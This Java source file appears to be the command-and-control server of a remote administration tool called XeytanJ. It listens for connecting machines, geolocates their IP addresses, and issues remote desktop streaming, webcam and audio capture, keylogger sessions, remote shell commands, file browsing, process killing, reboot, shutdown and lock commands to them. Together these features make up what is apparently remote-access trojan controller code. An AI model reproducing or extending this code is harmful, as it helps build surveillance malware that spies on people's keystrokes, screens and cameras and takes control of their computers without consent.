package com.melardev.xeytanj.services.net.transport.p2p;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.maxmind.geoip2.DatabaseReader;
import com.maxmind.geoip2.exception.GeoIp2Exception;
import com.maxmind.geoip2.model.CityResponse;
import com.melardev.xeytanj.IApplication;
import com.melardev.xeytanj.enums.MediaState;
import com.melardev.xeytanj.enums.NetworkProtocol;
import com.melardev.xeytanj.enums.ProcessInfoDetails;
import com.melardev.xeytanj.errors.UnexpextedStateException;
import com.melardev.xeytanj.maps.ClientGeoStructure;
import com.melardev.xeytanj.models.*;
import com.melardev.xeytanj.net.packets.PacketLogin;
import com.melardev.xeytanj.net.packets.PacketPresentation;
import com.melardev.xeytanj.net.packets.PacketType;
import com.melardev.xeytanj.net.packets.voice.PacketVoice;
import com.melardev.xeytanj.services.config.IConfigService;
import com.melardev.xeytanj.services.logger.ILogger;
import com.melardev.xeytanj.services.net.ClientContext;
import com.melardev.xeytanj.services.net.INetworkClientService;
import com.melardev.xeytanj.services.net.INetworkServerService;
import com.melardev.xeytanj.services.net.RemoteClient;
import org.springframework.stereotype.Service;

import javax.swing.*;
import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReadWriteLock;
import java.util.concurrent.locks.ReentrantReadWriteLock;

import static com.melardev.xeytanj.net.packets.PacketType.*;

@Service
public class P2PSyncTcpServerService implements INetworkServerService {

    private ConcurrentHashMap<UUID, RemoteClient> clients;

    private IApplication app;
    private IConfigService config;

    private DatabaseReader geoDB;
    private ServerRunnable serverRunnable;
    private ILogger logger;

    private final ReadWriteLock clientsRWLock;
    private final Lock readLock;
    private final Lock writeLock;

    public P2PSyncTcpServerService() {
        clients = new ConcurrentHashMap<UUID, RemoteClient>();

        clientsRWLock = new ReentrantReadWriteLock();
        readLock = clientsRWLock.readLock();
        writeLock = clientsRWLock.writeLock();
    }

    @Override
    public void initServer() {
        logger.traceCurrentMethodName();
        serverRunnable = new ServerRunnable(this, 3002);
        new Thread(serverRunnable).start();
    }


    public void onNewSocketConnection(Socket clientSocket) {
        logger.traceCurrentMethodName();
        UUID id = UUID.randomUUID();
        String globalIp = clientSocket.getInetAddress().getHostAddress();

        Client clientModel = new Client(id);

        P2PClientService clientService = new P2PClientService(this, clientSocket, clientModel.getId(), config);
        clientService.setLogger(logger);
        ClientContext context = new ClientContext(id);
        context.setNetClientService(clientService);

        RemoteClient remoteClient = new RemoteClient(context, clientModel);
        remoteClient.setGlobalIp(globalIp);

        try {
            clients.put(remoteClient.getClientId(), remoteClient);
            clientService.interactAsync();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    // ===============================================================================================
    // Callbacks triggered from App
    // ===============================================================================================
    @Override
    public void getClientInfo(UUID uuid) {
        logger.traceCurrentMethodName();
        RemoteClient remoteClient = getRemoteClientFromClientId(uuid);
        if (remoteClient != null) {
            remoteClient.appendExpectedPacket(PRESENTATION);
            remoteClient.getClientContext().getNetClientService().getSystemInfo();
        }
    }


    @Override
    public void startRemoteDesktop(UUID clientId) {

        logger.traceCurrentMethodName();

        if (!clients.containsKey(clientId))
            return;

        RemoteClient remoteClient = getRemoteClientFromClientId(clientId);
        if (remoteClient == null)
            return;
        INetworkClientService netClientService = remoteClient.getClientContext().getNetClientService();
        if (!netClientService.isStreamingDesktop()) {
            remoteClient.appendExpectedPacket(DESKTOP_CONFIG);
            netClientService.startRdpSession();
        }
    }

    @Override
    public void playRemoteDesktop(Client client, NetworkProtocol networkProtocol, String displayName, int delay, int scaleX, int scaleY) {
        logger.traceCurrentMethodName();
        RemoteClient remote = getRemoteClientFromClient(client);
        if (remote != null) {
            remote.appendExpectedPacket(DESKTOP);
            remote.getClientContext().getNetClientService().playRemoteDesktop(displayName, delay, scaleX, scaleY);
        }
    }

    @Override
    public void pauseRemoteDesktop(Client client) {
        logger.traceCurrentMethodName();
        RemoteClient remoteClient = getRemoteClientFromClient(client);
        remoteClient.getClientContext().getNetClientService().pauseRemoteDesktop();
    }

    @Override
    public void stopRemoteDesktop(Client client) {
        logger.traceCurrentMethodName();
        RemoteClient remote = getRemoteClientFromClient(client);
        remote.removeExpectedPacket(DESKTOP);
        remote.getClientContext().getNetClientService().stopRemoteDesktop();
    }

    // =========
    // Camera
    // ==========
    @Override
    public void startCameraSession(NetworkProtocol protocol, UUID uuid) {
        logger.traceCurrentMethodName();

        RemoteClient remoteClient = getRemoteClientFromClientId(uuid);

        if (remoteClient == null)
            return;

        INetworkClientService netClientService = remoteClient.getClientContext().getNetClientService();
        if (!netClientService.isStreamingCamera()) {
            remoteClient.appendExpectedPacket(CAMERA_CONFIG);
            netClientService.startCameraSession(NetworkProtocol.TCP);
        }
    }


    @Override
    public void playRemoteCamera(NetworkProtocol protocol, Client client, int cameraId, boolean muteAudio, int interval) {
        logger.traceCurrentMethodName();
        RemoteClient remoteClient = clients.get(client.getId());
        if (remoteClient == null) return;

        remoteClient.appendExpectedPacket(CAMERA);
        remoteClient.getClientContext().getNetClientService().playRemoteCamera(protocol, cameraId, muteAudio, interval);
    }

    @Override
    public void pauseCameraStreaming(Client client) {
        logger.traceCurrentMethodName();
        RemoteClient remoteClient = getRemoteClientFromClient(client);
        if (remoteClient == null) return;

        remoteClient.removeExpectedPacket(CAMERA);
        remoteClient.getClientContext().getNetClientService().pauseCameraStreaming();
    }

    @Override
    public void stopCameraSession(Client client) {
        logger.traceCurrentMethodName();
        RemoteClient remoteClient = clients.get(client.getId());
        if (remoteClient == null)
            return;

        remoteClient.removeExpectedPacket(CAMERA);
        remoteClient.getClientContext().getNetClientService().stopCameraSession();
    }

    // Not implemented yet
    @Override
    public void startAudioRecording(UUID uuid, PacketVoice.Mode dataType) {
        logger.traceCurrentMethodName();
        if (!clients.containsKey(uuid))
            return;
        clients.get(uuid).startVoIp(dataType);
    }

    @Override
    public void startListProcess(ProcessInfoDetails level, UUID clientId) {
        logger.traceCurrentMethodName();
        RemoteClient rc = clients.get(clientId);
        if (rc == null) return;
        rc.appendExpectedPacket(PROCESS);
        rc.getClientContext().getNetClientService().startListProcess(level);
    }

    @Override
    public void killProcess(Client client, int pid) {
        logger.traceCurrentMethodName();
        RemoteClient remoteClient = getRemoteClientFromClient(client);
        if (remoteClient != null) {
            clients.get(client.getId()).getClientContext().getNetClientService().killProcess(pid);
        }
    }

    @Override
    public void stopProcessMonitor(Client client) {
        logger.traceCurrentMethodName();
        RemoteClient rc = clients.get(client.getId());
        if (rc == null)
            return;

        rc.removeExpectedPacket(PROCESS);
        rc.getClientContext().getNetClientService().stopProcessMonitor();
    }

    @Override
    public void startFileManager(UUID clientId) {
        logger.traceCurrentMethodName();
        if (!clients.containsKey(clientId))
            return;
        RemoteClient rc = clients.get(clientId);
        rc.appendExpectedPacket(FILE_EXPLORER);
        rc.getClientContext().getNetClientService().startFileManagerSession();
    }


    @Override
    public void getFileSystemView(Client client, String fileSystemPath) {
        logger.traceCurrentMethodName();
        RemoteClient remoteClient = getRemoteClientFromClient(client);
        if (remoteClient == null)
            return;

        remoteClient.appendExpectedPacket(FILE_EXPLORER);
        remoteClient.getClientContext().getNetClientService().getFileSystemView(fileSystemPath);
    }


    @Override
    public void startChat(UUID clientId) {
        logger.traceCurrentMethodName();
        RemoteClient rc = clients.get(clientId);

        if (rc == null)
            return;

        rc.appendExpectedPacket(CHAT);
        rc.getClientContext().getNetClientService().startChatSession();
    }

    @Override
    public void onChatClosed(UUID uuid) {
        RemoteClient rc = clients.get(uuid);
        if (rc == null) return;

        app.onChatClosed(rc);
    }

    @Override
    public void sendChatMessage(Client client, String text) {
        logger.traceCurrentMethodName();
        if (clients.get(client.getId()) != null)
            clients.get(client.getId()).getClientContext().getNetClientService().sendChatMessage(text);
    }

    @Override
    public void startShellSession(UUID uuid) {
        logger.traceCurrentMethodName();
        RemoteClient remoteClient = clients.get(uuid);
        if (remoteClient == null) return;
        remoteClient.appendExpectedPacket(SHELL);
        remoteClient.getClientContext().getNetClientService().startShellSessionService();
    }

    @Override
    public void sendShellCommand(Client client, String command) {
        logger.traceCurrentMethodName();
        RemoteClient remoteClient = clients.get(client.getId());
        if (remoteClient == null) return;
        remoteClient.appendExpectedPacket(SHELL);
        remoteClient.getClientContext().getNetClientService().sendShellCommand(command);
    }

    @Override
    public void stopShellSession(Client client) {
        RemoteClient remoteClient = getRemoteClientFromClient(client);
        if (remoteClient == null)
            return;

        remoteClient.removeExpectedPacket(SHELL);
        remoteClient.getClientContext().getNetClientService().stopShellSession();
    }

    @Override
    public void startKeyloggerSession(UUID uuid) {
        logger.traceCurrentMethodName();
        clients.get(uuid).startKeyLogSession();
    }

    @Override
    public void startRebootSystem(UUID uuid) {
        logger.traceCurrentMethodName();
        RemoteClient rc = getRemoteClientFromClientId(uuid);

        if (rc == null)
            return;

        rc.startRebootSystem();
    }

    @Override
    public void startShutDownSystem(UUID uuid) {
        logger.traceCurrentMethodName();
        RemoteClient rc = getRemoteClientFromClientId(uuid);

        if (rc == null)
            return;

        rc.startShutDownSystem();
    }

    @Override
    public void startLogOffSystem(UUID uuid) {
        logger.traceCurrentMethodName();
        RemoteClient rc = getRemoteClientFromClientId(uuid);

        if (rc == null)
            return;

        rc.startLogOffSystem();

    }

    @Override
    public void startLockSystem(UUID uuid) {
        logger.traceCurrentMethodName();
        RemoteClient rc = getRemoteClientFromClientId(uuid);

        if (rc == null)
            return;

        rc.startLockSystem();
    }

    @Override
    public void startTurnDisplay(UUID uuid, boolean on) {
        logger.traceCurrentMethodName();
        RemoteClient rc = getRemoteClientFromClientId(uuid);

        if (rc == null)
            return;

        rc.startTurnDisplay(on);
    }

    // ===============================================================================================
    // Net client callbacks
    // ===============================================================================================
    public void onClientLoggedIn(UUID uuid, PacketLogin packet, String globalIp) {
        logger.traceCurrentMethodName();
        RemoteClient remote = getRemoteClientFromClientId(uuid);
        remote.setOs(packet.getOs());
        remote.setPcName(packet.getPcName());
        remote.setGlobalIp(globalIp);


        ClientGeoStructure clientGeoStructure = new ClientGeoStructure();

        String country = "unknown";
        if (!isPrivateIPv4(globalIp) && config.resolveGeoIpLocally()) {
            if (geoDB == null) {
                try {
                    geoDB = new DatabaseReader.Builder(getClass().getClassLoader().getResourceAsStream("geo/GeoLite2-City.mmdb")).build();
                } catch (IOException e) {
                    e.printStackTrace();
                    return;
                }
            }

            CityResponse city;

            try {

                city = geoDB.city(InetAddress.getByName(globalIp));
                clientGeoStructure.setCity(city.getCity().getName());
                clientGeoStructure.setCountry(city.getCountry().getName());
                clientGeoStructure.setLat(city.getLocation().getLatitude());
                clientGeoStructure.setLon(city.getLocation().getLongitude());

            } catch (IOException | GeoIp2Exception e) {
                e.printStackTrace();
                // Test data, this may happen when localhost is the client so
                // 127.0.0.1 is the Ip, Maxmind database will throw an exception

                clientGeoStructure.setCity("Paris");
                clientGeoStructure.setCountry("France");
                clientGeoStructure.setLat(2.2);
                clientGeoStructure.setLon(15.0);
            }

        } else {
            //Get info by website
            String geoData = "{\"as\":\"AS6739 VODAFONE ONO, S.A.\",\"city\":\"Random\",\"country\":\"France\",\"countryCode\":\"Random\",\"isp\":\"Random\",\"lat\":111.111,\"lon\":222.222,\"org\":\"Random \",\"query\":\"11.11.111.111\",\"region\":\"CT\",\"regionName\":\"Random\",\"status\":\"success\",\"timezone\":\"Europe/Madrid\",\"zip\":\"162100\"}";//getGeoData();
            JsonObject jsonObject = new JsonParser().parse(geoData).getAsJsonObject();
            country = jsonObject.get("country").getAsString();
            clientGeoStructure.setCity(jsonObject.get("city").getAsString());
            clientGeoStructure.setCountry(country);
            clientGeoStructure.setLat(jsonObject.get("lat").getAsDouble());
            clientGeoStructure.setLon(jsonObject.get("lon").getAsDouble());

        }

        remote.getClient().setGeoData(clientGeoStructure);
        remote.getClient().setOs(packet.getOs());

        remote.setLocalIp(packet.getlocalIp());

        app.onClientLoggedIn(remote);
    }

    private boolean isPrivateIPv4(String ipAddress) {
        try {
            String[] octetParts = ipAddress.split("\\.");

            int firstOctet = Integer.parseInt(octetParts[0]);
            int secondOctet = Integer.parseInt(octetParts[1]);

            switch (firstOctet) {
                case 10:
                case 127:
                    return true;
                case 172:
                    return (secondOctet >= 16) && (secondOctet < 32);
                case 192:
                    return (secondOctet == 168);
                case 169:
                    return (secondOctet == 254);
            }
        } catch (Exception ex) {
        }
        return false;
    }

    public static boolean isPrivateIPv6(String ipAddress) {
        boolean isPrivateIPv6 = false;
        String[] ipParts = ipAddress.trim().split(":");
        if (ipParts.length > 0) {
            String firstBlock = ipParts[0];
            String prefix = firstBlock.substring(0, 2);

            if (firstBlock.equalsIgnoreCase("fe80")
                    || firstBlock.equalsIgnoreCase("100")
                    || ((prefix.equalsIgnoreCase("fc") && firstBlock.length() >= 4))
                    || ((prefix.equalsIgnoreCase("fd") && firstBlock.length() >= 4))) {
                isPrivateIPv6 = true;
            }
        }
        return isPrivateIPv6;
    }


    @Override
    public void onPresentationData(UUID uuid, PacketPresentation packet) {
        RemoteClient remoteClient = getRemoteClientFromClientId(uuid);

        if (!remoteClient.isExpectingPacket(PRESENTATION))
            return;

        remoteClient.removeExpectedPacket(PRESENTATION);

        logger.traceCurrentMethodName();
        Map<String, String> properties = packet.getProperties();
        Map<String, String> env = packet.getEnv();
        String localIp = packet.getLocalIp();

        app.onClientPresented(remoteClient, env, properties);
    }


    @Override
    public void onClientLoginFail(INetworkClientService networkClientService) {
        // This is actually not used, indeed we don't add the client to the table
        // until he succeeds login so does not make sense this code
        logger.traceCurrentMethodName();
        RemoteClient remoteClient = getRemoteClientFromNetworkService(networkClientService);
        clients.remove(remoteClient.getClientId());
    }

    // ======================================
    // Desktop
    // ======================================

    public void onDesktopConfigInfoReceived(UUID uuid, List<ScreenDeviceInfo> config) {
        RemoteClient remoteClient = getRemoteClientFromClientId(uuid);
        if (remoteClient.isExpectingPacket(DESKTOP_CONFIG) &&
                !remoteClient.getClientContext().getNetClientService().isStreamingDesktop()) {
            remoteClient.removeExpectedPacket(DESKTOP_CONFIG);
            logger.traceCurrentMethodName();
            app.onRemoteDesktopConfigInfoReceived(remoteClient, config);
        }
    }

    public void onDesktopImageReceived(UUID uuid, ImageIcon image) {
        logger.traceCurrentMethodName();
        app.onRemoteDesktopInfoReceived(getRemoteClientFromClientId(uuid), image);
    }

    public void onCameraConfigInfoReceived(UUID uuid, List<CameraDeviceInfo> cameraIds) {
        logger.traceCurrentMethodName();
        RemoteClient client = getRemoteClientFromClientId(uuid);
        if (client == null) return;
        client.removeExpectedPacket(CAMERA_CONFIG);
        app.onRemoteCameraConfigInfoReceived(getRemoteClientFromClientId(uuid), cameraIds);
    }

    public void onCameraImageReceived(UUID uuid, Icon image) {
        logger.traceCurrentMethodName();
        app.onCameraPacketReceived(getRemoteClientFromClientId(uuid), image);
    }

    @Override
    public void onCameraSessionClosed(UUID uuid) {
        logger.traceCurrentMethodName();
        RemoteClient client = getRemoteClientFromClientId(uuid);
        if (client == null) return;
        client.removeExpectedPacket(CAMERA);
        app.onCameraSessionClosed(getRemoteClientFromClientId(uuid));
    }

    public void onClientDisconnected(UUID uuid) {
        logger.traceCurrentMethodName();
        RemoteClient client = clients.get(uuid);
        clients.remove(uuid);
        app.onClientDisconnected(client);
    }

    @Override
    public void onProcessSessionClosed(UUID uuid) {
        logger.traceCurrentMethodName();
        app.onProcessSessionClosed(getRemoteClientFromClientId(uuid));
    }

    @Override
    public void onFilesystemRootInfoReceived(UUID uuid, FileInfoStructure[] fileInfoStructures) {
        logger.traceCurrentMethodName();

        RemoteClient remoteClient = clients.get(uuid);
        if (remoteClient == null) return;

        remoteClient.removeExpectedPacket(FILE_EXPLORER);

        app.onFilesystemRootInfoReceived(getRemoteClientFromClientId(uuid), fileInfoStructures);
    }

    public void onFileSystemInfoUpdate(UUID uuid, FileInfoStructure[] fileInfoStructures) {
        logger.traceCurrentMethodName();
        app.onFileSystemInfoUpdate(getRemoteClientFromClientId(uuid), fileInfoStructures);
    }

    public void onClientReadyForShell(UUID uuid) {
        app.onClientReadyForShell(getRemoteClientFromClientId(uuid));
    }

    public void onKeylogDataReceived(UUID uuid, String logs) {
        logger.traceCurrentMethodName();
    }

    public void onKeylogSessionClosed(UUID uuid) {
        logger.traceCurrentMethodName();
        app.onKeylogSessionClosed(getRemoteClientFromClientId(uuid));
    }

    public void onProcessInfoReceived(UUID uuid, List<ProcessStructure> info) {
        logger.traceCurrentMethodName();
        app.onProcessInfoReceived(getRemoteClientFromClientId(uuid), info);
    }

    public void onClientShellInfoReceived(UUID uuid, String output) {
        logger.traceCurrentMethodName();
        app.onClientShellInfoReceived(getRemoteClientFromClientId(uuid), output);
    }

    public void onShellSessionClosedByUser(UUID uuid) {
        logger.traceCurrentMethodName();

        RemoteClient client = getRemoteClientFromClientId(uuid);
        if (client == null) return;
        client.removeExpectedPacket(SHELL);

        app.onShellSessionClosedByUser(getRemoteClientFromClientId(uuid));
    }

    public void onClientReadyForFileExplorerSession(UUID uuid) {
        logger.traceCurrentMethodName();
        app.onClientReadyForFileExplorerSession(getRemoteClientFromClientId(uuid));
    }

    public void onCameraAudioPacketReceived(UUID uuid, byte[] data, int bytesRead) {
        logger.traceCurrentMethodName();
        app.onCameraAudioPacketReceived(getRemoteClientFromClientId(uuid), data, bytesRead);
    }

    public void onAudioFileReceived(UUID uuid, byte[] data) {
        app.onAudioFileReceived(getRemoteClientFromClientId(uuid), data);
    }

    public void onChatMessageReceived(UUID uuid, String message) {
        app.onChatMessageReceived(getRemoteClientFromClientId(uuid), message);
    }

    public void onClientReadyForChat(UUID uuid) {
        logger.traceCurrentMethodName();
        app.onClientReadyForChat(getRemoteClientFromClientId(uuid));
    }

    // =================================================================================================
    // Getters
    // =================================================================================================
    private INetworkClientService getNetClientService(Client client) {
        INetworkClientService service = null;
        try {
            readLock.tryLock(5, TimeUnit.SECONDS);

            if (clients.containsKey(client.getId()))
                service = clients.get(client.getId()).getClientContext().getNetClientService();

        } catch (InterruptedException e) {
            e.printStackTrace();
        } finally {
            readLock.unlock();
        }

        return service;
    }

    public RemoteClient getRemoteClientFromClientId(UUID uuid) {
        logger.traceCurrentMethodName();
        RemoteClient client = null;
        try {
            readLock.tryLock(5, TimeUnit.SECONDS);

            client = clients.values().stream().filter(c -> c.getClientId() == uuid)
                    .findFirst()
                    .orElse(null);
        } catch (InterruptedException e) {
            e.printStackTrace();
        } finally {
            readLock.unlock();
        }

        return client;
    }

    @Override
    public void requestUninstallServer(Client client) {
        RemoteClient remoteClient = getRemoteClientFromClient(client);
        if (remoteClient == null) return;

        removeClient(remoteClient);
        remoteClient.getClientContext().getNetClientService().uninstallServer();
    }

    @Override
    public void closeConnection(UUID uuid) {
        RemoteClient remoteClient = getRemoteClientFromClientId(uuid);
        if (remoteClient == null) return;

        removeClient(remoteClient);
        remoteClient.getClientContext().getNetClientService().closeConnection();
    }

    public RemoteClient getRemoteClientFromClient(Client client) {
        return getRemoteClientFromClientId(client.getId());
    }

    @Override
    public boolean isClientStreamingDesktop(Client client) {
        logger.traceCurrentMethodName();
        RemoteClient rc = getRemoteClientFromClient(client);
        return rc.isStreamingDesktop();
    }

    @Override
    public MediaState getDesktopMediaState(Client client) {
        logger.traceCurrentMethodName();
        RemoteClient remoteClient = getRemoteClientFromClient(client);
        //TODO: Handle this better, show a notification saying the user is no longer in active connections
        if (remoteClient == null)
            return null;

        MediaState state = remoteClient.getClientContext().getNetClientService().getDesktopMediaState();
        if (state == null)
            return MediaState.STOPPED;
        return state;
    }

    private RemoteClient getRemoteClientFromNetworkService(INetworkClientService networkClientService) {
        logger.traceCurrentMethodName();
        return clients.values().stream().filter(c -> c.getClientContext().getNetClientService() == networkClientService)
                .findFirst()
                .orElseThrow(UnexpextedStateException::new);
    }


    @Override
    public ArrayList<Client> getAllClients() {
        logger.traceCurrentMethodName();
        ArrayList<Client> clients = new ArrayList<>();
        Iterator<RemoteClient> iterator = this.clients.values().iterator();
        while (iterator.hasNext()) {
            RemoteClient remoteClient = iterator.next();
            clients.add(remoteClient.getClient());
        }
        return clients;
    }


    public boolean shouldHandlePacket(PacketType packetType, UUID uuid) {
        RemoteClient remoteClient = getRemoteClientFromClientId(uuid);
        return remoteClient.isExpectingPacket(packetType);
    }

    // =================================================================================================
    // Setters
    // =================================================================================================
    @Override
    public void setConfig(IConfigService configService) {
        this.config = configService;
    }

    public void removeClient(RemoteClient remoteClient) {
        logger.traceCurrentMethodName();
        try {
            writeLock.tryLock(5, TimeUnit.SECONDS);
            clients.remove(remoteClient);
        } catch (InterruptedException e) {
            e.printStackTrace();
        } finally {
            writeLock.unlock();
        }
    }


    @Override
    public void setLogger(ILogger logger) {
        this.logger = logger;
    }

    @Override
    public void setApplication(IApplication application) {
        this.app = application;
    }

    // =================================================================================================
    // Server related methods
    // =================================================================================================
    @Override
    public void stopServer() {
        logger.traceCurrentMethodName();
        serverRunnable.setHasToRun(false);
    }

    public void onNewSocketConnection(RemoteClient client) {
        clients.put(client.getClientId(), client);
    }
}
